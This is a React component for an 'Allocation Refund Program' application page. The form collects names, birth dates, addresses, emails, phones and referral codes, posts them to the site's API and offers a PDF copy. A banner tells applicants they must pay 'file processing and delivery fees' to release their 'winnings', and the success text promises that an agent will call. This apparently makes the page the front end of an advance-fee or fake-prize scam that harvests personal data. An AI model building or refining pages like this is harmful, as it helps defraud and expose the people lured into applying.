import { useState } from "react";
import { useSearchParams } from "react-router-dom";
import { api } from "../api";
import { Field, btn, inputCls } from "../ui";
import { phoneCodes } from "../data/phone-codes";

function applicationPdf(application) {
  const canvas = document.createElement("canvas");
  canvas.width = 1240;
  canvas.height = 1754;
  const context = canvas.getContext("2d");
  context.fillStyle = "#ffffff";
  context.fillRect(0, 0, canvas.width, canvas.height);
  context.fillStyle = "#102f55";
  context.font = "bold 48px Arial, sans-serif";
  context.fillText("Application details", 88, 118);
  context.fillStyle = "#53657a";
  context.font = "28px Arial, sans-serif";
  context.fillText("Allocation Refund Program", 88, 166);
  context.fillStyle = "#1769aa";
  context.font = "bold 30px Arial, sans-serif";
  context.fillText(`Reference: ${application.reference}`, 88, 236);

  let y = 310;
  const left = 88;
  const maxWidth = 1064;
  const drawField = (label, value) => {
    context.fillStyle = "#53657a";
    context.font = "bold 20px Arial, sans-serif";
    context.fillText(label, left, y);
    y += 29;
    context.fillStyle = "#172b42";
    context.font = "21px Arial, sans-serif";
    const words = String(value || "—").split(/\s+/);
    let line = "";
    for (const word of words) {
      const candidate = line ? `${line} ${word}` : word;
      if (context.measureText(candidate).width <= maxWidth || !line) {
        line = candidate;
      } else {
        context.fillText(line, left, y);
        y += 29;
        line = word;
      }
    }
    if (line) {
      context.fillText(line, left, y);
      y += 39;
    }
  };

  drawField("First name", application.first_name);
  drawField("Last name", application.last_name);
  drawField("Email address", application.email);
  drawField("Phone number", application.phone || "Not provided");
  drawField("Date of birth", application.date_of_birth || "Not provided");
  drawField("Gender", application.gender || "Not provided");
  drawField("Current address", application.home_address || "Not provided");
  drawField("City", application.city || "Not provided");
  drawField("State", application.state || "Not provided");
  drawField("Postal/ZIP code", application.postal_code || "Not provided");
  drawField("Referral code", application.reference_code || "Not provided");
  drawField("Status", application.status_label);
  drawField("Submitted", new Date(application.created_at).toLocaleString());

  const jpeg = Uint8Array.from(atob(canvas.toDataURL("image/jpeg", 0.94).split(",")[1]), (char) => char.charCodeAt(0));
  const encoder = new TextEncoder();
  const pageContent = encoder.encode("q\n595.28 0 0 841.89 0 0 cm\n/Im0 Do\nQ\n");
  const objects = [
    encoder.encode("<< /Type /Catalog /Pages 2 0 R >>"),
    encoder.encode("<< /Type /Pages /Kids [3 0 R] /Count 1 >>"),
    encoder.encode("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595.28 841.89] /Resources << /XObject << /Im0 4 0 R >> >> /Contents 5 0 R >>"),
    [encoder.encode(`<< /Type /XObject /Subtype /Image /Width ${canvas.width} /Height ${canvas.height} /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode /Length ${jpeg.length} >>\nstream\n`), jpeg, encoder.encode("\nendstream")],
    [encoder.encode(`<< /Length ${pageContent.length} >>\nstream\n`), pageContent, encoder.encode("endstream")],
  ];
  const chunks = [encoder.encode("%PDF-1.4\n")];
  const offsets = [0];
  let length = chunks[0].length;
  objects.forEach((object, index) => {
    offsets.push(length);
    const parts = Array.isArray(object) ? object : [object];
    const opening = encoder.encode(`${index + 1} 0 obj\n`);
    chunks.push(opening, ...parts, encoder.encode("\nendobj\n"));
    length += opening.length + parts.reduce((total, part) => total + part.length, 0) + 8;
  });
  const xrefOffset = length;
  const xref = `xref\n0 ${offsets.length}\n0000000000 65535 f \n${offsets.slice(1).map((offset) => `${String(offset).padStart(10, "0")} 00000 n \n`).join("")}trailer\n<< /Size ${offsets.length} /Root 1 0 R >>\nstartxref\n${xrefOffset}\n%%EOF`;
  chunks.push(encoder.encode(xref));
  return new Blob(chunks, { type: "application/pdf" });
}

export function Apply() {
  const [searchParams] = useSearchParams();
  const referralFromLink = searchParams.get("ref") || "";
  const [form, setForm] = useState(() => ({ first_name: "", last_name: "", date_of_birth: "", gender: "", home_address: "", city: "", state: "", postal_code: "", email: "", country_code: "US", phone_number: "", reference_code: referralFromLink, consent: false }));
  const [errors, setErrors] = useState({}), [busy, setBusy] = useState(false), [result, setResult] = useState(null), [alert, setAlert] = useState(null);
  const bind = (key) => ({ value: form[key], onChange: (event) => setForm({ ...form, [key]: event.target.value }), onBlur: (event) => { if (event.target.validity && !event.target.validity.valid) setErrors({ ...errors, [key]: [event.target.validationMessage] }); } });
  const submit = async (event) => { event.preventDefault(); setBusy(true); setErrors({}); setAlert(null); try { const dialingCode = phoneCodes.find(([iso]) => iso === form.country_code)?.[2] || "+1"; const payload = { ...form, reference_code: referralFromLink || form.reference_code.trim(), phone: `${dialingCode} ${form.phone_number}`.trim() }; delete payload.country_code; delete payload.phone_number; const application = await api("/applications", { method: "POST", body: payload }); setResult(application); setAlert({ type: "success", title: "APPLICATION SUCCESSFUL.", body: `AN AGENT WILL CONTACT YOU SHORTLY. Your application number is ${application.reference}. Save it to check your application status.` }); window.scrollTo({ top: 0, behavior: "smooth" }); } catch (error) { const fieldErrors = error.errors || {}; setErrors(fieldErrors); const unknownFields = Object.keys(fieldErrors).filter((field) => !["first_name", "last_name", "date_of_birth", "gender", "home_address", "city", "state", "postal_code", "email", "phone", "reference_code", "consent"].includes(field)); const body = unknownFields.length ? `The server is requiring an unsupported field (${unknownFields.join(", ")}). This application form does not send it. The API deployment needs to be updated.` : Object.keys(fieldErrors).length ? "Review the highlighted fields and try again." : error.message; setAlert({ type: "error", title: "Could not submit application", body }); } finally { setBusy(false); } };
  const download = () => { const link = document.createElement("a"); const url = URL.createObjectURL(applicationPdf(result)); link.href = url; link.download = `${result.reference}-application.pdf`; link.click(); window.setTimeout(() => URL.revokeObjectURL(url), 1000); };
  return <section className="bg-soft/60 py-8 sm:py-12"><div className="mx-auto grid max-w-6xl gap-6 px-4 sm:px-6 lg:grid-cols-[1.2fr_.8fr] lg:px-8"><div><p className="text-xs font-bold uppercase tracking-[0.25em] text-brand">Application request</p><h1 className="mt-2 text-[clamp(1.65rem,5vw,2.25rem)] font-extrabold text-brand-dark">Apply for review</h1><p className="mt-2 text-sm leading-relaxed text-slate-600">Every application receives due consideration. Our team is committed to providing applicants with clear updates and guidance throughout the application process.</p><div className="mt-4 rounded-xl border border-amber-300 bg-amber-50 p-4 text-sm leading-relaxed text-amber-950">Note: You are required to pay the applicable file processing and delivery fees to complete the verification and finalize the release of your winnings.</div>
    {alert && <div role={alert.type === "error" ? "alert" : "status"} className={`mt-5 rounded-2xl border p-5 shadow-lg ${alert.type === "success" ? "border-emerald-200 bg-white" : "border-rose-200 bg-white"}`}><div className="flex items-start gap-3"><span className={`grid h-9 w-9 shrink-0 place-items-center rounded-full text-lg font-bold ${alert.type === "success" ? "bg-emerald-100 text-emerald-700" : "bg-rose-100 text-rose-700"}`}>{alert.type === "success" ? "✓" : "!"}</span><div><h2 className="font-bold text-brand-dark">{alert.title}</h2><p className="mt-1 text-sm text-slate-600">{alert.body}</p>{result && <div className="mt-4 flex flex-wrap gap-2"><button onClick={download} className="rounded-xl bg-brand px-4 py-2 text-sm font-semibold text-white">Download application details</button><a href={`/status?reference=${result.reference}`} className="rounded-xl border border-brand px-4 py-2 text-sm font-semibold text-brand">Check status</a></div>}</div></div></div>}
    <form onSubmit={submit} className="mt-5 space-y-4 rounded-2xl border border-line bg-white p-5 shadow-sm sm:p-7"><div className="grid gap-4 sm:grid-cols-2"><Field label="First name" error={errors.first_name}><input required maxLength={80} autoComplete="given-name" className={inputCls} {...bind("first_name")} /></Field><Field label="Last name" error={errors.last_name}><input required maxLength={80} autoComplete="family-name" className={inputCls} {...bind("last_name")} /></Field></div><div className="grid gap-4 sm:grid-cols-2"><Field label="Date of birth" error={errors.date_of_birth}><input required type="date" max={new Date().toISOString().slice(0, 10)} autoComplete="bday" className={inputCls} {...bind("date_of_birth")} /></Field><Field label="Gender" error={errors.gender}><select required className={inputCls} {...bind("gender")}><option value="">Select gender</option><option value="male">Male</option><option value="female">Female</option></select></Field></div><Field label="Current Address" error={errors.home_address}><textarea required maxLength={500} rows={3} autoComplete="address-line1" className={inputCls} {...bind("home_address")} /></Field><div className="grid gap-4 sm:grid-cols-2"><Field label="City" error={errors.city}><input required maxLength={100} autoComplete="address-level2" className={inputCls} {...bind("city")} /></Field><Field label="State" error={errors.state}><input required maxLength={100} autoComplete="address-level1" className={inputCls} {...bind("state")} /></Field><Field label="Postal/ZIP Code" error={errors.postal_code}><input required maxLength={20} autoComplete="postal-code" pattern="[A-Za-z0-9][A-Za-z0-9 -]{0,19}" title="Use letters, numbers, spaces, or hyphens." className={inputCls} {...bind("postal_code")} /></Field></div><Field label="Email address" error={errors.email}><input required type="email" maxLength={150} autoComplete="email" className={inputCls} {...bind("email")} /></Field>
    <Field label="Phone number" error={errors.phone}><div className="grid grid-cols-[minmax(0,1fr)_minmax(7rem,1.2fr)] gap-2"><select aria-label="Country calling code" className={`${inputCls} min-w-0`} value={form.country_code} onChange={(event) => setForm({ ...form, country_code: event.target.value })}>{phoneCodes.map(([iso, country, code]) => <option key={iso} value={iso}>{country} ({code})</option>)}</select><input aria-label="Phone number" required type="tel" inputMode="tel" autoComplete="tel-national" pattern="[0-9 ()-]{5,20}" title="Enter a valid phone number using digits, spaces, parentheses, or hyphens." className={`${inputCls} min-w-0`} {...bind("phone_number")} /></div></Field>
    <Field label="Reference number" hint={referralFromLink ? "This code came from your application link." : "Enter the active code provided by your administrator."} error={errors.reference_code}><input required maxLength={32} readOnly={Boolean(referralFromLink)} aria-readonly={Boolean(referralFromLink)} className={`${inputCls} ${referralFromLink ? "bg-slate-50 text-slate-600" : ""}`} value={referralFromLink || form.reference_code} onChange={(event) => setForm({ ...form, reference_code: event.target.value })} /></Field><div><label className="flex items-start gap-3 text-sm leading-relaxed"><input type="checkbox" required className="mt-1 h-4 w-4 shrink-0 accent-brand" checked={form.consent} onChange={(e) => setForm({ ...form, consent: e.target.checked })} /><span>I confirm these details are accurate and may be used to review my request and contact me.</span></label>{errors.consent && <p role="alert" className="mt-1 text-sm text-rose-600">{errors.consent[0]}</p>}</div><button disabled={busy} className={`${btn} w-full`}>{busy ? "Submitting…" : "Submit application"}</button></form></div>
    <aside className="h-fit rounded-3xl border border-line bg-white p-6 shadow-sm"><h2 className="text-lg font-bold text-brand-dark">What happens next?</h2><ol className="mt-4 space-y-4 text-sm text-slate-600">{[["1", "Staff receive your application for review."], ["2", "Save the reference number shown after submission."], ["3", "Use Check status with your reference and email."], ["4", "Download a copy of the details for your records."]].map(([n, text]) => <li key={n} className="flex gap-3"><span className="grid h-7 w-7 shrink-0 place-items-center rounded-full bg-soft font-bold text-brand">{n}</span><span>{text}</span></li>)}</ol></aside></div></section>;
}
